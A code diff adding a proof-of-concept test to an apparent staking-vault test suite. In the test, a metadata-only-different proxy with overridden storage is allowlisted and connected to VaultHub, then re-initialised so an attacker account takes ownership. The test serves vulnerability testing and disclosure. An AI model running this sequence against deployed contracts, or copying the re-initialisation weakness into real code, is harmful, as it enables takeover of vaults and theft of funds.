@@ -14,6 +14,7 @@ import {
   generatePostDeposit,
   generatePredeposit,
   generateValidator,
+  impersonate,
   log,
   prepareLocalMerkleTree,
   updateBalance,
@@ -54,6 +55,7 @@ describe("Scenario: Staking Vaults Happy Path", () => {
 
   let owner: HardhatEthersSigner;
   let nodeOperator: HardhatEthersSigner;
+  let attacker: HardhatEthersSigner;
   let depositContract: string;
 
   const reserveRatio = 10_00n; // 10% of ETH allocation as reserve
@@ -70,7 +72,7 @@ describe("Scenario: Staking Vaults Happy Path", () => {
     ctx = await getProtocolContext();
     snapshot = await Snapshot.take();
 
-    [, owner, nodeOperator] = await ethers.getSigners();
+    [, owner, nodeOperator, attacker] = await ethers.getSigners();
 
     const { depositSecurityModule } = ctx.contracts;
     depositContract = await depositSecurityModule.DEPOSIT_CONTRACT();
@@ -419,7 +421,70 @@ describe("Scenario: Staking Vaults Happy Path", () => {
     expect(await vaultHub.locked(stakingVaultAddress)).to.equal(0);
   });
 
+  it("Take away ownership back. SHOULD NOT PASS", async () => {
+    ctx = await getProtocolContext();
+
+    const { depositSecurityModule, predepositGuarantee, vaultHub, stakingVaultFactory } = ctx.contracts;
+    depositContract = await depositSecurityModule.DEPOSIT_CONTRACT();
+
+    // instantiate correct vault and add hash
+    const deployTx = await stakingVaultFactory
+      .connect(owner)
+      .createVaultWithDashboard(owner, nodeOperator, nodeOperator, VAULT_NODE_OPERATOR_FEE, CONFIRM_EXPIRY, [], {
+        value: VAULT_CONNECTION_DEPOSIT,
+      });
+    const createVaultTxReceipt = (await deployTx.wait()) as ContractTransactionReceipt;
+    const createVaultEvents = ctx.getEvents(createVaultTxReceipt, "VaultCreated");
+
+    stakingVaultAddress = createVaultEvents[0].args?.vault;
+
+    const vaultImpl = await ethers.deployContract("StakingVault", [depositContract]);
+
+    const data = vaultImpl.interface.encodeFunctionData("initialize", [
+      owner.address,
+      nodeOperator.address,
+      predepositGuarantee.address,
+    ]);
+    const badProxy = await ethers.deployContract("PinnedBeaconProxy__StorageOverride", [
+      ctx.contracts.stakingVaultBeacon,
+      data,
+    ]);
+
+    const adminRole = await vaultHub.DEFAULT_ADMIN_ROLE();
+    const admin = await vaultHub.getRoleMember(adminRole, 0);
+    const adminSigner = await impersonate(admin, ether("1"));
+    await vaultHub.connect(adminSigner).grantRole(await vaultHub.VAULT_CODEHASH_SET_ROLE(), admin);
+    let codehash = ethers.keccak256(await ethers.provider.getCode(stakingVaultAddress));
+    await vaultHub.connect(adminSigner).setAllowedCodehash(codehash, true);
+    codehash = ethers.keccak256(await ethers.provider.getCode(badProxy));
+    await vaultHub.connect(adminSigner).setAllowedCodehash(codehash, true);
+
+    // checkin the code is identical except metadata
+    const goodProxyCode = stripMetadata(await ethers.provider.getCode(stakingVaultAddress));
+    const badProxyCode = stripMetadata(await ethers.provider.getCode(badProxy));
+    expect(goodProxyCode).to.equal(badProxyCode);
+
+    const vault = await ethers.getContractAt("StakingVault", badProxy);
+
+    await setBalance(await badProxy.getAddress(), ether("10"));
+    await vault.connect(owner).transferOwnership(vaultHub);
+    await vaultHub.connect(owner).connectVault(vault);
+
+    await vault.initialize(attacker.address, attacker.address, attacker.address);
+    expect(await vault.owner()).to.equal(attacker.address);
+    expect(await vault.nodeOperator()).to.equal(attacker.address);
+    expect(await vault.depositor()).to.equal(attacker.address);
+  });
+
   async function isSoleRoleMember(account: HardhatEthersSigner, role: string) {
     return (await dashboard.getRoleMemberCount(role)).toString() === "1" && (await dashboard.hasRole(role, account));
   }
 });
+
+function stripMetadata(bytecode: string) {
+  const hex = bytecode.startsWith("0x") ? bytecode.slice(2) : bytecode;
+  // Last 2 bytes (4 hex chars) encode the CBOR length (big-endian) per solc.
+  const cborLen = parseInt(hex.slice(-4), 16);
+  const totalMetaHexLen = cborLen * 2 + 4; // CBOR + the 2 length bytes
+  return "0x" + hex.slice(0, hex.length - totalMetaHexLen);
+}
